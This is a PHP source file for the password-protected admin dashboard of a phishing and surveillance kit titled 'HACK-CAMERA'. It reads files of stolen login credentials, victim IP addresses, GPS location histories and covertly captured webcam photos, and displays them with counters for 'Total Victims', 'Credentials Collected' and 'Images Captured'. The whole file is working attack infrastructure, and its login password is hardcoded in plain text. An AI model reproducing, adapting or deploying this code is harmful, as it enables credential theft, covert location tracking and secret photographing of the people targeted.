<?php
session_start();

// Simple authentication
$username = "admin";
$password = "hackadmin123";

// Check if user is already logged in
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    // Check if login form was submitted
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === $username && $_POST['password'] === $password) {
            $_SESSION['logged_in'] = true;
        } else {
            $error = "Invalid credentials";
        }
    }
    
    // If still not logged in, show login form
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Admin Login</title>
            <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
            <style>
                body {
                    font-family: 'Roboto', sans-serif;
                    background-color: #f5f5f5;
                    margin: 0;
                    padding: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                }
                .login-container {
                    background-color: white;
                    padding: 30px;
                    border-radius: 5px;
                    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
                    width: 350px;
                }
                h1 {
                    text-align: center;
                    color: #333;
                    margin-bottom: 30px;
                }
                .form-group {
                    margin-bottom: 20px;
                }
                label {
                    display: block;
                    margin-bottom: 5px;
                    color: #555;
                }
                input[type="text"], input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                    box-sizing: border-box;
                }
                .submit-btn {
                    width: 100%;
                    padding: 10px;
                    background-color: #4CAF50;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 16px;
                }
                .submit-btn:hover {
                    background-color: #45a049;
                }
                .error {
                    color: #f44336;
                    margin-bottom: 20px;
                    text-align: center;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <h1>Admin Login</h1>
                <?php if (isset($error)) { ?>
                    <div class="error"><?php echo $error; ?></div>
                <?php } ?>
                <form method="post">
                    <div class="form-group">
                        <label for="username">Username</label>
                        <input type="text" id="username" name="username" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <button type="submit" class="submit-btn">Login</button>
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Get data files
$ip_file = '../social/forwarding_link/ip.txt';
$credentials_file = '../social/forwarding_link/credentials.txt';
$location_history_file = '../social/forwarding_link/location_history.txt';
$images_dir = '../captured_images/';

// Functions to read file content
function readFileContent($file) {
    if (file_exists($file)) {
        return file_get_contents($file);
    }
    return "No data available";
}

function getLocationHistory($file) {
    if (file_exists($file)) {
        $content = file_get_contents($file);
        $lines = explode("\n", $content);
        $history = [];
        
        foreach ($lines as $line) {
            if (empty(trim($line))) continue;
            
            $parts = explode(",", $line);
            if (count($parts) >= 4) {
                $history[] = [
                    'time' => $parts[0],
                    'ip' => $parts[1],
                    'lat' => $parts[2],
                    'lng' => $parts[3],
                    'accuracy' => isset($parts[4]) ? $parts[4] : 'N/A',
                    'altitude' => isset($parts[5]) ? $parts[5] : 'N/A',
                    'speed' => isset($parts[6]) ? $parts[6] : 'N/A',
                    'heading' => isset($parts[7]) ? $parts[7] : 'N/A'
                ];
            }
        }
        
        return $history;
    }
    return [];
}

function getCapturedImages($dir) {
    $images = [];
    if (is_dir($dir)) {
        foreach (glob($dir . "*.png") as $image) {
            $images[] = [
                'path' => $image,
                'name' => basename($image),
                'time' => date("Y-m-d H:i:s", filemtime($image))
            ];
        }
    }
    return $images;
}

// Get data
$ip_data = readFileContent($ip_file);
$credentials_data = readFileContent($credentials_file);
$location_history = getLocationHistory($location_history_file);
$captured_images = getCapturedImages($images_dir);

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: dashboard.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HACK-CAMERA Admin Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #3f51b5;
            --secondary-color: #ff4081;
            --text-color: #333;
            --light-text: #777;
            --bg-color: #f5f5f5;
            --card-bg: #fff;
            --danger-color: #f44336;
            --success-color: #4caf50;
            --info-color: #2196f3;
            --warning-color: #ff9800;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Roboto', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            line-height: 1.6;
        }
        
        .container {
            display: flex;
            min-height: 100vh;
        }
        
        .sidebar {
            width: 250px;
            background-color: var(--primary-color);
            color: white;
            padding: 20px 0;
            position: fixed;
            height: 100vh;
            overflow-y: auto;
        }
        
        .sidebar-header {
            padding: 0 20px 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
        }
        
        .sidebar-header h2 {
            margin-bottom: 5px;
        }
        
        .sidebar-nav {
            margin-top: 20px;
        }
        
        .sidebar-nav a {
            display: block;
            padding: 15px 20px;
            color: rgba(255, 255, 255, 0.8);
            text-decoration: none;
            transition: all 0.3s;
        }
        
        .sidebar-nav a:hover, .sidebar-nav a.active {
            background-color: rgba(255, 255, 255, 0.1);
            color: white;
        }
        
        .sidebar-nav i {
            margin-right: 10px;
            width: 20px;
            text-align: center;
        }
        
        .content {
            flex: 1;
            margin-left: 250px;
            padding: 20px;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
        }
        
        .header h1 {
            color: var(--primary-color);
        }
        
        .logout-btn {
            background-color: var(--danger-color);
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
            font-size: 14px;
        }
        
        .section {
            background-color: var(--card-bg);
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin-bottom: 30px;
        }
        
        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
        }
        
        .section-title {
            font-size: 1.5rem;
            color: var(--primary-color);
        }
        
        .data-container {
            background-color: #f9f9f9;
            padding: 15px;
            border-radius: 4px;
            white-space: pre-wrap;
            overflow-x: auto;
            font-family: monospace;
            max-height: 400px;
            overflow-y: auto;
        }
        
        .grid-container {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
        }
        
        .grid-item {
            background-color: var(--card-bg);
            border-radius: 5px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        .grid-item img {
            width: 100%;
            height: 200px;
            object-fit: cover;
        }
        
        .grid-item-content {
            padding: 15px;
        }
        
        .grid-item-title {
            font-size: 1.1rem;
            margin-bottom: 5px;
        }
        
        .grid-item-time {
            color: var(--light-text);
            font-size: 0.9rem;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        table th, table td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #eee;
        }
        
        table th {
            background-color: #f2f2f2;
            font-weight: 500;
        }
        
        table tr:hover {
            background-color: #f9f9f9;
        }
        
        .map-container {
            height: 400px;
            margin-top: 20px;
            border-radius: 4px;
            overflow: hidden;
        }
        
        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 12px;
            font-size: 0.8rem;
            font-weight: 500;
        }
        
        .badge-info {
            background-color: var(--info-color);
            color: white;
        }
        
        .badge-success {
            background-color: var(--success-color);
            color: white;
        }
        
        .badge-warning {
            background-color: var(--warning-color);
            color: white;
        }
        
        .badge-danger {
            background-color: var(--danger-color);
            color: white;
        }
        
        @media (max-width: 768px) {
            .sidebar {
                width: 70px;
                padding: 10px 0;
            }
            
            .sidebar-header {
                padding: 0 10px 10px;
            }
            
            .sidebar-header h2, .sidebar-nav span {
                display: none;
            }
            
            .sidebar-nav a {
                text-align: center;
                padding: 15px 0;
            }
            
            .sidebar-nav i {
                margin-right: 0;
                font-size: 1.2rem;
            }
            
            .content {
                margin-left: 70px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="sidebar">
            <div class="sidebar-header">
                <h2>HACK-CAMERA</h2>
                <div>Admin Dashboard</div>
            </div>
            <div class="sidebar-nav">
                <a href="#dashboard" class="active"><i class="fas fa-tachometer-alt"></i> <span>Dashboard</span></a>
                <a href="#credentials"><i class="fas fa-key"></i> <span>Credentials</span></a>
                <a href="#tracking"><i class="fas fa-map-marker-alt"></i> <span>Location Tracking</span></a>
                <a href="#images"><i class="fas fa-camera"></i> <span>Captured Images</span></a>
                <a href="#ip"><i class="fas fa-network-wired"></i> <span>IP Information</span></a>
                <a href="dashboard.php?logout=1"><i class="fas fa-sign-out-alt"></i> <span>Logout</span></a>
            </div>
        </div>
        
        <div class="content">
            <div class="header">
                <h1>Admin Dashboard</h1>
                <a href="dashboard.php?logout=1" class="logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
            </div>
            
            <div class="section" id="dashboard">
                <div class="section-header">
                    <h2 class="section-title">Dashboard Overview</h2>
                </div>
                
                <div class="grid-container">
                    <div class="grid-item">
                        <div class="grid-item-content">
                            <i class="fas fa-users fa-3x" style="color: var(--info-color);"></i>
                            <h3>Total Victims</h3>
                            <div style="font-size: 2rem; margin: 10px 0;">
                                <?php
                                // Count unique IPs
                                $unique_ips = [];
                                foreach ($location_history as $location) {
                                    $unique_ips[$location['ip']] = 1;
                                }
                                echo count($unique_ips);
                                ?>
                            </div>
                            <div style="color: var(--light-text);">Unique IP addresses tracked</div>
                        </div>
                    </div>
                    
                    <div class="grid-item">
                        <div class="grid-item-content">
                            <i class="fas fa-key fa-3x" style="color: var(--success-color);"></i>
                            <h3>Credentials Collected</h3>
                            <div style="font-size: 2rem; margin: 10px 0;">
                                <?php
                                // Count login details sections
                                echo substr_count($credentials_data, "LOGIN DETAILS");
                                ?>
                            </div>
                            <div style="color: var(--light-text);">Login credentials captured</div>
                        </div>
                    </div>
                    
                    <div class="grid-item">
                        <div class="grid-item-content">
                            <i class="fas fa-camera fa-3x" style="color: var(--warning-color);"></i>
                            <h3>Images Captured</h3>
                            <div style="font-size: 2rem; margin: 10px 0;">
                                <?php echo count($captured_images); ?>
                            </div>
                            <div style="color: var(--light-text);">Webcam photos collected</div>
                        </div>
                    </div>
                    
                    <div class="grid-item">
                        <div class="grid-item-content">
                            <i class="fas fa-map-marker-alt fa-3x" style="color: var(--danger-color);"></i>
                            <h3>Location Points</h3>
                            <div style="font-size: 2rem; margin: 10px 0;">
                                <?php echo count($location_history); ?>
                            </div>
                            <div style="color: var(--light-text);">GPS coordinates tracked</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="section" id="credentials">
                <div class="section-header">
                    <h2 class="section-title">Captured Credentials</h2>
                </div>
                
                <div class="data-container">
                    <?php echo htmlspecialchars($credentials_data); ?>
                </div>
            </div>
            
            <div class="section" id="tracking">
                <div class="section-header">
                    <h2 class="section-title">Location Tracking</h2>
                </div>
                
                <?php if (!empty($location_history)): ?>
                    <table>
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>IP Address</th>
                                <th>Coordinates</th>
                                <th>Accuracy</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($location_history as $location): ?>
                                <tr>
                                    <td><?php echo htmlspecialchars($location['time']); ?></td>
                                    <td><?php echo htmlspecialchars($location['ip']); ?></td>
                                    <td><?php echo htmlspecialchars($location['lat']) . ', ' . htmlspecialchars($location['lng']); ?></td>
                                    <td><?php echo htmlspecialchars($location['accuracy']); ?> m</td>
                                    <td>
                                        <a href="https://www.google.com/maps/place/<?php echo htmlspecialchars($location['lat']) . ',' . htmlspecialchars($location['lng']); ?>" target="_blank" style="color: var(--info-color);">
                                            <i class="fas fa-map-marked-alt"></i> View on Maps
                                        </a>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                    
                    <div id="map" class="map-container"></div>
                    <script>
                        // This would be implemented with Google Maps API
                        // You would need to add your Google Maps API key
                        function initMap() {
                            // Map initialization code would go here
                            console.log("Map initialized");
                        }
                    </script>
                <?php else: ?>
                    <p>No location data available yet.</p>
                <?php endif; ?>
            </div>
            
            <div class="section" id="images">
                <div class="section-header">
                    <h2 class="section-title">Captured Images</h2>
                </div>
                
                <?php if (!empty($captured_images)): ?>
                    <div class="grid-container">
                        <?php foreach ($captured_images as $image): ?>
                            <div class="grid-item">
                                <img src="<?php echo htmlspecialchars($image['path']); ?>" alt="Captured image">
                                <div class="grid-item-content">
                                    <div class="grid-item-title"><?php echo htmlspecialchars($image['name']); ?></div>
                                    <div class="grid-item-time"><?php echo htmlspecialchars($image['time']); ?></div>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>
                <?php else: ?>
                    <p>No images captured yet.</p>
                <?php endif; ?>
            </div>
            
            <div class="section" id="ip">
                <div class="section-header">
                    <h2 class="section-title">IP Information</h2>
                </div>
                
                <div class="data-container">
                    <?php echo htmlspecialchars($ip_data); ?>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // Smooth scrolling for anchor links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                
                document.querySelector(this.getAttribute('href')).scrollIntoView({
                    behavior: 'smooth'
                });
                
                // Update active nav link
                document.querySelectorAll('.sidebar-nav a').forEach(link => {
                    link.classList.remove('active');
                });
                this.classList.add('active');
            });
        });
    </script>
</body>
</html> 